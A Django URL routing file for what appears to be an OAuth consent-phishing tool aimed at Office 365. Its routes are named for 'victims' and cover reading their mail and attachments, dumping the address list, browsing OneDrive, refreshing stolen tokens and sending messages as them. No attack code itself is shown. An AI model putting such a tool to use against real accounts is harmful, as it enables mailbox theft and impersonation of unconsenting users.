from django.conf.urls import url
from . import views

from django.views.generic.base import TemplateView
from django.contrib.auth.decorators import login_required
app_name = 'office365'
ID_REGEX = '[a-zA-Z0-9\-\=\_]+'



#TODO fix that URL param needs to be hardcoded in
urlpatterns = [
    url(r'^victims/$', views.Index.as_view(), name='index'),
    url(r'^schema$', login_required(TemplateView.as_view(template_name= 'oauth_office365/oas3.json', content_type='application/json')), name='schema'),
    url(r'^app_detail$', views.AppDetailViewGeneric.as_view(), name='app_detail'),
    url(r'^refresh/(?P<victim_id>[0-9]+)$', views.ForceTokenRefresh.as_view(), name='force_refresh'),
    url(r'^victim/(?P<victim_id>[0-9]+)$', views.VictimDetailView.as_view(), name='victim_detail'),
    url(r'^victim/(?P<victim_id>[0-9]+)/messages$', views.MailMessageView.as_view(), name='victim_messages'),
    url(r'^victim/(?P<victim_id>[0-9]+)/message/(?P<id>[a-zA-Z0-9-_=]+)$', views.MailMessageDetail.as_view(), name='victim_message_detail'),
    url(r'^victim/(?P<victim_id>[0-9]+)/message/(?P<message_id>[a-zA-Z0-9-_=]+)/attachment/(?P<attachment_id>[a-zA-Z0-9-_=]+)$', views.MailAttachmentView.as_view(), name='victim_message_attachments'),
    url(r'^victim/(?P<victim_id>[0-9]+)/gal$', views.DumpUsersView.as_view(), name='victim_dump_users'),
    url(r'^victim/(?P<victim_id>[0-9]+)/drive/(?P<id>[a-zA-Z0-9\-\=\_]*)$', views.OneDriveView.as_view(), name='victim_onedrive'),
    url(r'^victim/(?P<victim_id>[0-9]+)/attachment_test', views.AttachmentViewGeneric.as_view(), name='attach-test'),
    url(r'^victim/(?P<victim_id>[0-9]+)/message_send', views.MessageViewGeneric.as_view(), name='message-send'),
    url(r'^callback$', views.token_callback, name='callback'),

]